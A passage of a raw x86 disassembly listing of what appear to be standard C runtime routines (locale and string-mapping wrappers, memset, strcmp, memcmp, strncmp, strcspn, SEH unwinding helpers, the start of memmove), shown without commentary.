  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
